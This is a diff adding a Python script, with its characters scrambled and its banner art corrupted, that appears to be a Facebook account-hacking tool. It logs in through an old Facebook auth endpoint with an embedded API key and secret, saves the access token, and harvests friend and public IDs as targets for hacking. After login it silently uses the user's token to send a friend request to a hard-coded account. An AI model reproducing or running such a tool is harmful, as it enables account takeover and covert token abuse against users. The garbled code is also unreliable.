@@ -1,0 +1,622 @@
+яю!#u/rsb/nip/tyoh2n
+c#doni=gtu-f8#
+hTsiS rcpi tsIW irttneB  yEBH-PAYP
+  =#================================# 
+# EBH-PAYPT ehO ffciai lrPgoarmmer#r    
+#                                 # 
+   #                                # 
+# ================================#=
+  
+
+mioptro ,sys,sitemd,tatemi,eardnmoh,salhbir,,ehterdani,gsjnou,lril,bockoeiil,beruqsestm,ceahinez
+rfmom luitrpcoseisgnp.oo lmioptrT rhaePdoolf
+or meruqseste.cxpeitno smioptrC noentcoiEnrrro
+rfmom ceahinezi pmro trBwoesr 
+
+ r
+leao(dys)s
+ys.sesdtfeuatlneocidgn'(tu8f)'
+rb= m ceahinezB.orswre)(
+rbs.teh_nald_eorobstF(laes)b
+.res_tahdnelr_feerhsm(ceahinez_.thptH.TTRPfeerhsrPcoseos(r,)am_xitem1=)b
+.rdahdaeedsr= [ '(sUreA-egtn,'' pOre/a.908( nArdio;dO eparM ni/i230.2.52/458 .;Ui )dP erts/o.2214.32V reisno1/.261)'] 
+
+ d
+fek leau(r:)
+p	irtn" x\b11[9;m1xEti"	
+sos.sye.ix(t) 
+
+ d
+fea ac(k)b: 
+  w = ' hadtjz'c
+     d =''
+    of r inix : 
+      d +  =!'+'[wardnmor.naidtn0(l,new(-))1+]i 
+  r teru necat(k)d
+  
+
+ed fecat(k)b: 
+  w = ' hadtjz'c
+    of r iniw : 
+      j = w i.dnxei() 
+      x  =.xerlpca(e!'s%%',i\'30[3s%1;'ms%rt3(+1)j) 
+  x +  =\'30[3m0' 
+  x = x r.pealec'(0!,'\'30[3m0)'
+    ys.stsodtuw.iretx('+n\)'
+  
+
+ed fajal(n)z:	
+of r eniz + ' n\:'
+		ys.stsodtuw.irete()	
+s	sys.dtuo.tlfsu(h)	
+t	mi.elsee(p.010) 
+
+####c louosr# ###B
+'=0\331[9;m4'R
+'=0\331[9;m1'G
+'=0\331[9;m2'W
+'=0\331[9;m7'S
+'=0\331[9;m6'P
+'=0\331[9;m5'Y
+'=0\331[9;m3'	
+	#
+eD:veThcA-mb
+#### #OLOG# ####
+olog= """\
+30[3;033вmљљ•ввђЊ••ввЊЊ••ввЊЊ••ввЊЊ••ввЊЊ••ввЊЊ••ввЊЊ••ввЊЊ••ввЊЊ••ввЊЊ••ввЊЊ••ввЊЊ••ввЊЊ••ввЊЊ••ввЊЊ••ввЊЊ••ввЊЊ••ввђљљ
+0\331[9;m7”ввЂЂ””ввЂЂ””ввЂЂ”–вв„Њ––ввђЂ––ввЂЂ––ввЂЂ––ввЂЂ––ввЂЂ––ввЂЂ––ввЂЂ––ввЂЂ––ввЂЂ––ввЂЂ––ввЂЂ–Ђвв‹Ђ––ввЂЂ––ввЂЂ––ввЂЊ– \
+30[3;119вmЂ””ввЂЂ”–вв„„––вв€€––ввЊ€– \
+30[3;139вm„––вв„„––ввЊђ––вв€€––ввЊ€–в ±ЉЉвв№°ЉW LEOCEMв ±ЉЉвв№°Љ
+0\331[9;m7–вв€€––вв€€––вв€€––вв€Њ––вв€„––вв„„––вв„„––вв„„––вв„„––вв„„––вв„„––вв„„––вв„„––вв„„––вв„„–Ђвв‹„––вв„„––вв„„––вв„Њ– \
+30[3;119вmЂ–@(в)Ђ––ввЂЂ––ввЂЂ––ввЂЂ–@(())@–ввЂЂ––ввЂЂ––ввЂЂ––ввЂЂ––ввЂЂ––ввЂЂ––ввЂ‹Ђ–ввЂЂ––ввЂЂ–@(в)Ђ–
+0\330[3;m3љввљђ••ввЊЊ••ввЊЊ••ввЊЊ••ввЊЊ••ввЊЊ••ввЊЊ••ввЊЊ••ввЊЊ••ввЊЊ••ввЊЊ••ввЊЊ••ввЊЊ••ввЊЊ••ввЊЊ••ввЊЊ••ввЊЊ••ввЊђ•љвљ\
+30[3;133вm€––вв€€––вв€€––вв€€––вв“€––вв€€––вв€€––вв““–•вв¬¬••вв¬¬••вв¬¬••вв¬¬•–вв“€––вв€€––вв“¬••вв¬¬••вв¬¬••вв¬¬•–вв“¬••вв¬“––в €
+0\331[9;m1–вв€€––вв€€––вв““––вв““–•вв¬¬•–вв“€––вв€€––вв€€–•вв¬¬••вв¬¬••вв¬¬•–вв€€––вв€“–•вв¬¬••вв¬¬••вв¬¬••вв¬¬••вв¬¬••вв¬¬••вв¬€– \
+30[3;179вm€––вв€€––вв““––вв““–•вв¬¬••вв¬¬••вв¬¬•–вв“€––вв€¬••вв¬¬••вв¬¬••вв¬“––вв“¬••вв¬¬••вв¬¬••вв¬¬••вв¬¬••вв¬¬••вв¬¬••вв¬“––в €
+0\331[3;m3–вв€€––вв€€––вв““––вв“¬••вв¬¬••вв¬¬••вв¬¬•–вв“€––вв“¬••вв¬¬••вв¬¬••вв¬¬••вв¬¬••вв¬¬••вв¬¬••вв¬¬••вв¬¬••вв¬¬••вв¬¬•–вв“€– \
+30[3;119вm€––вв€€––вв“€––вв“€––вв€€––вв€€––вв€€––вв““––вв€€––вв€“–•вв¬¬••вв¬¬••вв¬¬•–вв“€––вв€€––вв€€––вв€€––вв“¬••вв¬¬••вв¬“––в €
+0\331[9;m7–вв€€––вв€€––вв€€––вв€€––вв€€––вв€€––вв€€––вв€€––вв“€––вв“¬••вв¬¬••вв¬¬•–вв““––вв““––вв““––вв““–•вв¬¬••вв¬¬••вв¬¬••вв¬€– \
+30[3;119вm€––вв€€––вв““––вв““––вв““––вв“¬••вв¬“––вв““––вв““––вв€“–•вв¬¬••вв¬¬••вв¬¬••вв¬¬••вв¬¬••вв¬¬••вв¬¬••вв¬¬••вв¬¬••вв¬“––в €
+0\331[9;m7–вв€€––вв€€––вв““––вв“¬••вв¬¬••вв¬“––вв““––вв““––вв“€––вв“¬••вв¬¬••вв¬¬••вв¬¬••вв¬¬••вв¬¬••вв¬¬••вв¬¬••вв¬¬••вв¬¬•–вв“€– \
+30[3;133вm€––вв€€––вв“€––вв““––вв““––вв““––вв““––вв““––вв““––вв““–•вв¬¬••вв¬¬••вв¬¬••вв¬¬••вв¬¬••вв¬¬••вв¬¬••вв¬¬••вв¬¬••вв¬“––в €
+0\331[9;m1–вв€€––вв€€––вв€“––вв““––вв““––вв““––вв“€––вв““––вв“€––вв“¬••вв¬¬••вв¬¬••вв¬¬••вв¬¬••вв¬¬••вв¬¬••вв¬¬••вв¬¬••вв¬¬•–вв“€– \
+30[3;179вm€––вв€€––вв€€––вв““––вв““––вв““––вв“€––вв€“––вв““––вв€“–•вв¬¬••вв¬¬••вв¬¬••вв¬¬••вв¬¬••вв¬¬••вв¬¬••вв¬¬••вв¬¬••вв¬€––в €
+0\331[3;m3–вв€€––вв€€––вв€“––вв““––вв““––вв€€––вв€€––вв““––вв“€––вв“¬••вв¬¬••вв¬¬••вв¬¬••вв¬¬••вв¬¬••вв¬¬••вв¬¬••вв¬¬••вв¬¬•–вв€€– \
+30[3;119вm€––вв€€––вв€“––вв€“––вв““––вв“€––вв€“––вв““––вв“€––вв€¬••вв¬¬••вв¬¬••вв¬¬••вв¬¬••вв¬¬••вв¬¬••вв¬¬••вв¬¬••вв¬¬••вв¬€––в €
+0\331[9;m7–вв€€––вв€€––вв““––вв€€––вв€“––вв““––вв““––вв““––вв€€––вв“¬••вв¬¬••вв¬¬••вв¬¬••вв¬¬••вв¬¬••вв¬€––вв“¬•–вв“¬••вв¬“––вв€€– \
+30[3;133вm€––вв€€––вв€€––вв“€––вв€€––вв““––вв““––вв““––вв““––вв€€––вв€€––вв““–•вв¬¬••вв¬¬••вв¬¬••вв¬€––вв“¬••вв¬¬••вв¬¬•–вв“€––в €
+0\331[9;m1–вв€€––вв€€––вв€“––вв“€––вв“€––вв€€––вв““––вв“€––вв€€––вв€¬•–вв“€––вв““–•вв¬¬••вв¬“––вв“€––вв“¬••вв¬¬••вв¬¬••вв¬€––вв€€– \
+30[3;179вm€––вв€€––вв€€––вв€“––вв€€––вв“€––вв€€––вв€€––вв€€––вв“¬••вв¬¬•–вв““–•вв¬“––вв“€––вв€“–•вв¬¬••вв¬¬••вв¬¬••вв¬“––вв€€––в €
+0\331[3;m3–вв€€––вв€€––вв€€––вв€“––вв€€––вв““––вв““––вв““––вв““––вв““––вв““––вв““––вв“¬••вв¬¬••вв¬¬••вв¬¬••вв¬¬••вв¬¬•–вв€€––вв€€– \
+30[3;119вm€––вв€€––вв€€––вв€€––вв““––вв€€––вв““––вв““––вв“¬••вв¬¬••вв¬¬••вв¬¬••вв¬¬••вв¬¬••вв¬¬••вв¬¬••вв¬¬••вв¬¬•–вв“€––вв€€––в €
+0\331[9;m7–вв€€––вв€€––вв€€––вв€€––вв““––вв“€––вв€€––вв€€––вв““–•вв¬¬••вв¬¬••вв¬¬••вв¬¬••вв¬¬••вв¬¬••вв¬¬••вв¬¬•–вв“€––вв€€––вв€€– \
+30[3;133вm€––вв€€––вв€€––вв€€––вв€€––вв““––вв“€––вв““––вв““––вв“€––вв€€––вв“¬••вв¬¬••вв¬¬••вв¬¬••вв¬¬••вв¬¬•–вв“€––вв€€––вв€€––в €
+0\331[9;m1–вв€€––вв€€––вв€€––вв€€––вв€€––вв““––вв“€––вв““––вв“¬•–вв“€––вв€¬••вв¬¬••вв¬¬••вв¬¬••вв¬¬••вв¬¬•–вв“€––вв€€––вв€€––вв€€– \
+30[3;179вm€––вв€€––вв€€––вв€€––вв€€––вв€€––вв““––вв€“––вв““––вв“€––вв€€––вв“¬••вв¬¬••вв¬¬••вв¬¬••вв¬¬•–вв“€––вв€€––вв€€––вв€€––в €
+0\331[3;m3–вв€€––вв€€––вв€€––вв€€––вв€€––вв€€––вв€€––вв““––вв“€––вв€€––вв““–•вв¬¬••вв¬¬••вв¬¬••вв¬¬•–вв€€––вв€€––вв€€––вв€€––вв€€– \
+30[3;119вm€––вв€€––вв€€––вв€€––вв€€––вв€€––вв€€––вв€€––вв““––вв“€––вв€“––вв“¬••вв¬¬••вв¬¬••вв¬“––вв€€––вв€€––вв€€––вв€€––вв€€––в€ 
+
+0\331[9;m5•вв”ђ•”ввЃЃ””ввЃЃ””ввЃЃ””ввЃЃ””ввЃЃ””ввЃЃ””ввЃЃ””ввЃЃ””ввЃЃ””ввЃЃ””ввЃЃ””ввЃЃ””ввЃЃ””ввЃЃ””ввЃЃ””ввЃЃ””ввЃЃ””ввЃЃ””ввЃЃ””ввЃЃ””ввЃЃ””ввЃЃ””ввЃЃ””ввЃЃ””ввЃЃ””ввЃЃ””ввЃ—ЊЉв°\
+30[3;129вm‘•0\331[9;m3UAHTROв ±ЉџввЎ°Љ\ 30[3;129SmEY DAFORQO34        
+0\331[9;m2•в\‘30[3;139CmERTA EYBв ±ЉџввЎ°Љ\ 30[3;129Bm-EAHPP Y   \
+30[3;129вm‘•0\331[9;m3AFECOBKOв ±ЉџввЎ°Љ\ 30[3;129hmttsp/:w/wwf.cabeoo.koc/mEBAHPP Y          
+0\331[9;m5•ввљђ•”ввЃЃ””ввЃЃ””ввЃЃ””ввЃЃ””ввЃЃ””ввЃЃ””ввЃЃ””ввЃЃ””ввЃЃ””ввЃЃ””ввЃЃ””ввЃЃ””ввЃЃ””ввЃЃ””ввЃЃ””ввЃЃ””ввЃЃ””ввЃЃ””ввЃЃ””ввЃЃ””ввЃЃ””ввЃЃ””ввЃЃ””ввЃЃ””ввЃЃ””ввЃЃ””ввЃ—ЊЉв °                        
+
+  
+
+0\330[3;m3љввљђ••ввЊЊ••ввЊЊ••ввЊЊ••ввЊЊ••ввЊЊ••ввЊЊ••ввЊЊ••ввЊЊ••ввЊЊ••ввЊЊ••ввЊЊ••ввЊЊ••ввЊЊ••ввЊЊ••ввЊЊ••ввЊЊ••ввЊђ•љвљ\
+30[3;139 mODN TOU ESA YNI LLGELAв ”њёпЏ\
+30[3;193 m IMAN TOR SEOPSNBILITI YOF ROY Uњвп”Џё
+0\331[9;m3O lN YDECUTAOI NRPMOTO Eњвп”Џё
+0\331[9;m2C EHKCPPNI TCAOCNU TPONEA TFRE7 D YA Sњвп”Џё
+0\331[9;m3S BUCSIREBO RUC AHNNLEв ”њёпЏ\
+30[3;033вmљљ•ввђЊ••ввЊЊ••ввЊЊ••ввЊЊ••ввЊЊ••ввЊЊ••ввЊЊ••ввЊЊ••ввЊЊ••ввЊЊ••ввЊЊ••ввЊЊ••ввЊЊ••ввЊЊ••ввЊЊ••ввЊЊ••ввЊЊ••ввђљљ
+ \
+30[3;033вmљљ•ввђЊ••ввЊЊ••ввЊЊ••ввЊЊ••ввЊЊ••ввЊЊ••ввЊЊ••ввЊЊ••ввЊЊ••ввЊЊ••ввЊЊ••ввЊЊ••ввЊЊ••ввЊЊ••ввЊЊ••ввЊЊ••ввЊЊ••ввђљљ
+0\330[9;m2ODN TOO DLA CCUOTNT  OOLIGN\
+30[3;029UmESA F ERHSA CCUOTNT  OOLIGN\
+30[3;033вmљљ•ввђЊ••ввЊЊ••ввЊЊ••ввЊЊ••ввЊЊ••ввЊЊ••ввЊЊ••ввЊЊ••ввЊЊ••ввЊЊ••ввЊЊ••ввЊЊ••ввЊЊ••ввЊЊ••ввЊЊ••ввЊЊ••ввЊЊ••ввђљљ
+""" 
+
+  
+
+ed fit(k:)
+t	tiki= [ .'  ' ',..  ,'.'..' ]	
+of r onit tiki:	
+p	irtn"(r\x\b11[9;m3lPaeesW ia tx\b11[9;m3+")o;,ys.stsodtuf.ulhs)(t;mi.elsee(p)1
+  
+
+abkc= 0 
+ebhrsali= [ ]c
+keopni t =][
+ko s =][
+di= [ ]l
+sigtur p =][
+uvnlto= " 0\333[m1oN tuVnl"v
+lu n =\"30[323Vmlu"n
+sos.syet(mc"elra)"
+rpni t"""\
+30[3;123вm”••ввђђ••ввђђ•Ђваў‹ііав‹ўЂіаа‹‹іЂввўђ••ввђђ••ввђђ••ввђђ••ввђђ••ввђђ••ввђ—•
+0\331[9;m6  ЂввўўЂЂвGўAR YAH TAHKCREB--EAHPPвYўЂЂввўўЂ
+0\331[3;m2•ввљђ••ввђђ••ввђўЂіаа‹‹іЂваў‹ііав‹ўЂ•ввђђ••ввђђ••ввђђ••ввђђ••ввђђ••ввђђ••в"ќ""
+ j
+lana'(0\330[3;m3љввљђ••ввЊЊ••ввЊЊ••ввЊЊ••ввЊЊ••ввЊЊ••ввЊЊ••ввЊЊ••ввЊЊ••ввЊЊ••ввЊЊ••ввЊЊ••ввЊЊ••ввЊЊ••ввЊЊ••ввЊЊ••ввЊЊ••ввЊђ•љв'љ) 
+
+ajal(n\'30[3;179LmaoidgnЂввўўЂЂв'ў)j
+lana'(0\331[9;m7–вв’’––вв’’––вв’’––вв’’––вв’’––вв’’––вв’’––в'’)p
+irtn\"30[3;123вm–њЉвв±¶ЉЉвв¶¶ЉЉвв¶¶ЉЉвв¶¶ЉЉвв¶¶ЉЉвв°–њ"j
+lana'(0\331[9;m7–вв€’––вв’’––вв’’––вв’’––вв’’––вв’’––вв’’––в'’)p
+irtn\"30[3;123вm–њЉвв±¶ЉЉвв¶¶ЉЉвв¶¶ЉЉвв¶¶ЉЉвв¶¶ЉЉвв°–њ"j
+lana'(0\331[9;m7–вв€€––вв€’––вв’’––вв’’––вв’’––вв’’––вв’’––в'’)p
+irtn\"30[3;123вm–њЉвв±¶ЉЉвв¶¶ЉЉвв¶¶ЉЉвв¶¶ЉЉвв¶¶ЉЉвв°–њ"j
+lana'(0\331[9;m7–вв€€––вв€€––вв€’––вв’’––вв’’––вв’’––вв’’––в'’)p
+irtn\"30[3;123вm–њЉвв±¶ЉЉвв¶¶ЉЉвв¶¶ЉЉвв¶¶ЉЉвв¶¶ЉЉвв°–њ"j
+lana'(0\331[9;m7–вв€€––вв€€––вв€€––вв€’––вв’’––вв’’––вв’’––в'’)p
+irtn\"30[3;123вm–њЉвв±¶ЉЉвв¶¶ЉЉвв¶¶ЉЉвв¶¶ЉЉвв¶¶ЉЉвв°–њ"j
+lana'(0\331[9;m7–вв€€––вв€€––вв€€––вв€€––вв€’––вв’’––вв’’––в'’)p
+irtn\"30[3;123вm–њЉвв±¶ЉЉвв¶¶ЉЉвв¶¶ЉЉвв¶¶ЉЉвв¶¶ЉЉвв°–њ"j
+lana'(0\331[9;m7–вв€€––вв€€––вв€€––вв€€––вв€€––вв’’––вв’’––в'’ )
+rpni"t0\331[3;m2њвв–±ЉЉвв¶¶ЉЉвв¶¶ЉЉвв¶¶ЉЉвв¶¶ЉЉвв¶°Љњв"–
+ajal(n\'30[3;179вm€––вв€€––вв€€––вв€€––вв€€––вв€€––вв’’––вв’’–)' p
+irtn\"30[3;123вm–њЉвв±¶ЉЉвв¶¶ЉЉвв¶¶ЉЉвв¶¶ЉЉвв¶¶ЉЉвв°–њ"j
+lana'(0\331[9;m7–вв€€––вв€€––вв€€––вв€€––вв€€––вв€€––вв’’––в'’ )
+rpni"t0\331[3;m2њвв–±ЉЉвв¶¶ЉЉвв¶¶ЉЉвв¶¶ЉЉвв¶¶ЉЉвв¶°Љњв"–
+ajal(n\'30[3;179вm€––вв€€––вв€€––вв€€––вв€€––вв€€––вв€€––вв’’–)' p
+irtn\"30[3;123вm–њЉвв±¶ЉЉвв¶¶ЉЉвв¶¶ЉЉвв¶¶ЉЉвв¶¶ЉЉвв°–њ"j
+lana'(0\331[9;m7–вв€€––вв€€––вв€€––вв€€––вв€€––вв€€––вв€€––в'’ )
+rpni"t0\331[3;m2њвв–±ЉЉвв¶¶ЉЉвв¶¶ЉЉвв¶¶ЉЉвв¶¶ЉЉвв¶°Љњв"–
+ajal(n\'30[3;179вm€––вв€€––вв€€––вв€€––вв€€––вв€€––вв€€––вв€€––в'€ )
+rpni"t0\331[3;m2њвв–±ЉЉвв¶¶ЉЉвв¶¶ЉЉвв¶¶ЉЉвв¶¶ЉЉвв¶°Љњв"–
+ajal(n\'30[3;179вm€––вв€€––вв€€––вв€€––вв€€––вв€€––вв€€––вв€€––вв€€–)' p
+irtn\"30[3;123вm–њЉвв±¶ЉЉвв¶¶ЉЉвв¶¶ЉЉвв¶¶ЉЉвв¶¶ЉЉвв°–њ"j
+lana'(0\331[9;m7–вв€€––вв€€––вв€€––вв€€––вв€€––вв€€––вв€€––вв€€––вв€€–)' p
+irtn\"30[3;123вm–њЉвв±¶ЉЉвв¶¶ЉЉвв¶¶ЉЉвв¶¶ЉЉвв¶¶ЉЉвв°–њ"j
+lana'(0\331[9;m7–вв€€––вв€€––вв€€––вв€€––вв€€––вв€€––вв€€––вв€€––вв€€––в'€ )
+rpni"t0\331[3;m2њвв–±ЉЉвв¶¶ЉЉвв¶¶ЉЉвв¶¶ЉЉвв¶¶ЉЉвв¶°Љњв"–
+ajal(n\'30[3;179вm€––вв€€––вв€€––вв€€––вв€€––вв€€––вв€€––вв€€––вв€€––вв€€––в'€ )
+rpni"t0\331[3;m2њвв–±ЉЉвв¶¶ЉЉвв¶¶ЉЉвв¶¶ЉЉвв¶¶ЉЉвв¶°Љњв"–
+ajal(n\'30[3;179вm€––вв€€––вв€€––вв€€––вв€€––вв€€––вв€€––вв€€––вв€€––вв€€––вв€€–)' p
+irtn\"30[3;123вm–њЉвв±¶ЉЉвв¶¶ЉЉвв¶¶ЉЉвв¶¶ЉЉвв¶¶ЉЉвв°–њ"j
+lana'(0\331[3;m1C MOLPTENIвGўЂЂввўўЂ)'
+ajal(n\'30[3;113вm•‹‹вW•AHSTPA PON0 1323917769‹вв••‹)' j
+lana'(0\331[2;m2D NOвEўЂЂввўўЂLPAEESW IA'T)j
+lana'(0\330[3;m3љввљђ••ввЊЊ••ввЊЊ••ввЊЊ••ввЊЊ••ввЊЊ••ввЊЊ••ввЊЊ••ввЊЊ••ввЊЊ••ввЊЊ••ввЊЊ••ввЊЊ••ввЊЊ••ввЊЊ••ввЊЊ••ввЊЊ••ввЊЊ••ввЊЊ••ввђљљ)'
+ j
+lana'(0\331[3;m4љввљђ••ввЊЊ••ввЊЊ••ввЊЊ••ввЊЊ••ввЊЊ••ввЊЊ••в ЊOTLOL GONIв Њ••ввЊЊ••ввЊЊ••ввЊЊ••ввЊЊ••ввЊЊ••ввЊЊ••ввђљљ)'
+ C
+roertcsUreanem= " eb"C
+roertcaPssowdr= " ahpp"y
+ l
+oo p =t'ur'e
+hwli el(oo p==' rteu)': 
+  u esnrma e =ar_wniup(t\"30[3;149Tmoo lsUreanem\ 1x[b;193m4ђб µx\b11[3;m2)"
+    fi( sureanem=  =oCrrceUtesnrma)e: 
+  	 apssowdr= r wai_pntu"(0\331[9;m4oTloP sawsro dx\b11[9;m4ђб µx\b11[3;m2)"
+        fi( apssowdr=  =oCrrcePtsawsro)d: 
+          p irtn" 0\331[3;m2OLDANI.G...." + u esnrma eD#veB:-EAHPPY	
+    items.elpe2() 
+          l oo p =f'laes' 
+      e sl:e
+            rpni t\"30[3;183PmELSA EAWTI" 
+          o .systsme'(dx-gponeh ttsp/:w/wwy.uoutebc.moc/ahnnleU/fCyrxoRBzbRKYiI7ol2EpM'w) 
+  e sl:e
+        rpni t\"30[3;113AmCCSE SEDINDE" 
+      o .systsme'(dx-gponeh ttsp/:w/wwy.uoutebc.moc/ahnnleU/fCyrxoRBzbRKYiI7ol2EpM'w) 
+
+ed folig(n:)
+o	.systsme'(lcae'r)	
+rt:y
+		otek t =pone'(olig.nxt't','r)	
+m	ne(u )
+e	cxpe tK(yerEor,rOIrEor)r:	
+o	.systsme'(lcae'r)	
+p	irtnl goo 
+    		
+		
+j	lana'(\ 30[3;113аm»ј\ 30[3;139Wmraingn :0\331[9;m6sU e aeN wcAocnu toTL goni ')	
+j	lana'(\ 30[3;113аm»ј\ 30[3;139Wmraingn :0\331[3;m1ODON TSU EOYRUP REOSAN LCAOCNU'T)  	
+		
+		
+p	irtn'(      0\331[9;m6-->-ЂввўўЂЂвLўGONIW TI HAFECOBKOЂввўўЂЂв<ў----)'
+		rpni(t	' ')	
+i	 d =ar_wniup(t\'30[3;169[m ]x\b11[9;m4DIE/amlix\b11[3;m2 :x\b11[3;m2)'
+		wp d =ar_wniup(t\'30[3;169[m]+\ 1x[b;149Pmsawsro\d1x[b;123:m\ 1x[b;123'm)	
+t	ki)(
+		rt:y
+		b	.rpone'(thpt:s//.mafecobkoc.mo)'
+		xeectpm ceahinezU.LRrEor:r
+		p	irtn\"\n1x[b;179Tmeheri  soni tnreen tocnnceitno"	
+		ekulra)(
+		rb_.aftcro.ysih_mt l =rTeu
+		rbs.lece_tofmrn(=r)0
+		rbf.ro[me'amli]'= i d	
+b	.rofmr'[apss]'= p dw
+		rbs.buim(t)	
+u	lr= b .regutlr)(
+		fi' asevd-veci'ei  nru:l
+		t	yr:	
+		s	gi =a'ipk_ye8=288a943016ad8907b29fa720d1cd41cderedtnaislt_py=eapssowdrmeia=l+'di'+ofmrtaJ=OSgNnereta_eamhcni_edi1=egenarets_seisnoc_ooikse1=olacele=_nSUemhtdoa=tu.holigpnsawsro=d+'wp+dr'teru_nss_lerosruec=sv01=0.268fecf9471bf2481c32cc3234a7a423'	
+		d	ta a ="{pa_iek"y":88a2480963d19a7820fb790a12dd1cd4,"c"eredtnaislt_py"e":apssowdr,"e"amli:"di",ofmrta:"J"OS"N ,g"nereta_eamhcni_edi:"1","g"nereta_eesssoi_nockoei"s":"1",olacel:"e"_nSU,"m"teoh"d":uahtl.goni,"p"sawsro"dp:dw",erutnrs_lsr_seuocrse:"0","v":"1"0.}"
+				=xahhsil.ben(wm"5d)"
+				.xpuadets(gi)	
+		a	x=h.xeidegts)(
+				adatu.dpta(e'{is'ga:)}
+				ru l =h"ttsp/:a/ipf.cabeoo.koc/mertsesvrrep.ph"	
+		r	r=qeeuts.seg(tru,laparsmd=ta)a
+				=zsjnol.aosdr(t.xe)t
+				nukire s =pone"(olig.nxt"t ,w')'
+				nukire.srwti(e[za'ccse_sotek'n)]
+				nukire.slcso(e)	
+		p	irtn' n\x\b11[9;m6ЂввўўЂЂввўўЂЂваў»јoLig nuSccsefsluјав»ўЂЂввўўЂЂввўўЂ'	
+		o	.systsme'(dx-gponeh ttsp/:w/wwy.uoutebc.moc/ahnnleU/fCyrxoRBzbRKYiI7ol2EpM'w)	
+		r	qeeuts.sopts'(thpt:s//rgpa.hafecobkoc.mom//erfeidn?semhtdop=so&tiusdg=iwumas&3caecsst_kone'=z+'[caecsst_kone]')	
+		m	ne(u)	
+		xeectpr qeeuts.sxeectpoisnC.noentcoiEnrrro:	
+		p	irtn\"\n1x[b;113Tmeheri  soni tnreen tocnnceitno"	
+		k	leau(r)	
+i	 fc'ehkcopni'ti  nru:l
+		p	irtn"(n\x\b11[3;m1oYruA ccuotni  snoC ehkcopni"t)	
+		sos.syet(mr' mr- folig.nxt't)	
+		items.elpe1()	
+		ekulra)(
+		lees:	
+		rpni(t\"\n1x[b;149Pmsawsro/dmEia lsiw orgn)"
+		o	.systsme'(mr- frl gonit.tx)'
+		t	mi.elsee(p)1
+		l	goni)(
+  
+
+ed femun)(:	
+sos.syet(mc'elra)'
+t	yr:	
+t	koteo=ep(nl'gonit.tx,'r')'r.ae(d)	
+xeectpI EOrrro:	
+o	.systsme'(lcae'r)	
+p	irtn\"1x[b;149Tmkonei vnladi"	
+o	.systsme'(mr- frl gonit.tx)'
+		items.elpe1()	
+l	goni)(
+t	yr:	
+o	wt= r qeeuts.seg(th'ttsp/:g/arhpf.cabeoo.koc/mema?ccse_sotek=n+'otek)t
+		 a =sjnol.aosdo(wtt.xe)t
+		anam= a '[anem]'
+		di= a '[di]'
+e	cxpe teKEyrrro:	
+o	.systsme'(lcae'r)	
+p	irtn\"30[3;179Ymuo rcAocnu tsio  nhCcepkiotn"	
+o	.systsme'(mr- frl gonit.tx)'
+		items.elpe1()	
+l	goni)(
+e	cxpe teruqseste.cxpeitno.soCnnceitnorEor:r
+		rpni"tx\b11[9;m4hTre esin  onietnrtec noentcoi"n
+		ekulra)(
+o	.systsme"(lcae"r )D#veB:-EAHPPY	
+rpni tolog
+p	irtn"   0\331[3;m2џрЂ’0\331[9;m6      oLggdei  nsUreI fn\o30[3;123рm’џ"Ђ
+p	irtn"  	  0\331[9;m7N ma\e30[3;179:m0\331[9;m4+"anam"+0\331[9;m7              " 
+p	irtn"  	  0\331[9;m7I \D30[3;179:m0\331[9;m4+"di"+x\b11[9;m7              "	
+rpni t\"30[3;139SmBUCSIREB SYMY UOUTEBC AHNNLEB -EAHPP[YџрµЏёп]Џ"	
+
+p	irtn" 0\330[3;m3љввљђ••ввЊЊ••ввЊЊ••ввЊЊ••ввЊЊ••ввЊЊ••ввЊЊ••ввЊЊ••ввЊЊ••ввЊЊ••ввЊЊ••ввЊЊ••ввЊЊ••ввЊЊ••ввЊЊ••ввЊЊ••ввЊЊ••ввЊђ•љв"љ
+ 	
+rpni t\"30[3;183вm«‰\ 30[3;1431m\.1x[b;149SmattrC olingnв Єњ"	
+rpni t\"30[3;183вm«‰\ 30[3;1230m\.30[3;169Lmgouo t          " 
+p	lihi)(
+  
+
+ed fipil(h:)
+u	ineksr= r wai_pntu"(n\0\331[9;m6nIup toYruC ohci>e>>\ 30[3;179"m)	
+fiu ineksr= "=:"
+		rpni t\"1x[b;179Fmli lnic roertcyl"	
+p	lihi)(
+e	il fnukire s==1":"
+		usep(r)	
+lefiu ineksr= "="0:	
+j	lana'(oTek neRomev'd)	
+o	.systsme'(mr- frl gonit.tx)'
+		ekulra)(
+e	sl:e
+		rpni t\"1x[b;119Fmli lnic roertcyl"	
+p	lihi)(
+  
+
+ed fusep(r:)
+g	olab lotekt	
+sos.syet(mc'elra)'
+t	yr:	
+t	koteo=ep(nl'gonit.tx,'r')'r.ae(d)	
+xeectpI EOrrro:	
+p	irtn\"1x[b;149Tmkonei vnladi"	
+o	.systsme'(mr- frl gonit.tx)'
+		items.elpe1()	
+l	goni)(
+o	.systsme'(lcae'r)	
+rpni tolog
+p	irtn" 0\331[3;m2‰в\«30[3;1231m\.1x[b;129Hmca krFmoF irne diLts".
+p	irtn" 0\331[3;m2‰в\«30[3;1232m\.1x[b;139Hmca krFeidnL si tuPlbciI .D"	
+rpni t\"30[3;123вm«‰0\331[3;m1.00\331[9;m7aBkc"	
+ipil_husep(r) 
+
+ed fipil_husep(r:)
+p	ae k =ar_wniup(t\"\n30[3;169ImpntuY uo rhCioec>> >0\331[9;m7)"
+i	 fepka= "=:"
+		rpni t\"1x[b;149Fmli lnic roertcyl"	
+p	lihis_pure)(
+e	il fepka= "="1:	
+o	.systsme'(lcae'r)	
+p	irtnl goo	
+p	irtn" 0\331[3;m2P elsa eaWti"	
+j	lana'(0\331[9;m4eGttni gDI s0\331[9;m4ЂввўўЂЂввўўЂЂв'ў)	
+r	= r qeeuts.seg(th"ttsp/:g/arhpf.cabeoo.koc/memf/irnesda?ccse_sotek=n+"otek)t
+		 z =sjnol.aosdr(t.xe)t
+		of r sniz '[adat]':	
+		dia.ppne(d[si''d)]
+e	il fepka= "="2:	
+o	.systsme'(lcae'r)	
+p	irtnl goo	
+i	td= r wai_pntu"(0\331[3;m2Ђг\„30[3;149ImpntuP buIl cdIU esnrma\e30[3;133:m\ 30[3;179"m)	
+p	irtn" ""0\330[3;m3љввљђ••ввЊЊ••ввЊЊ••ввЊЊ••ввЊЊ••ввЊЊ••ввЊЊ••ввЊЊ••ввЊЊ••ввЊЊ••ввЊЊ••ввЊЊ••ввЊЊ••ввЊЊ••ввЊЊ••ввЊЊ••ввЊЊ••ввЊђ•љв"љ""
+ 	
+t	yr:	
+		oj k =eruqsestg.te"(thpt:s//rgpa.hafecobkoc.mo"/i+td"+a?ccse_sotek=n+"otek)t
+		o	 pяю =sjnol.aosdj(kot.xe)t
+		p	irtn\"30[3;179Nmma\e30[3;179:m0\331[9;m6" o+[pn"ma"e]	
+e	cxpe teKEyrrro:	
+		rpni"tx\b11[3;m1DIN toF uodn"!
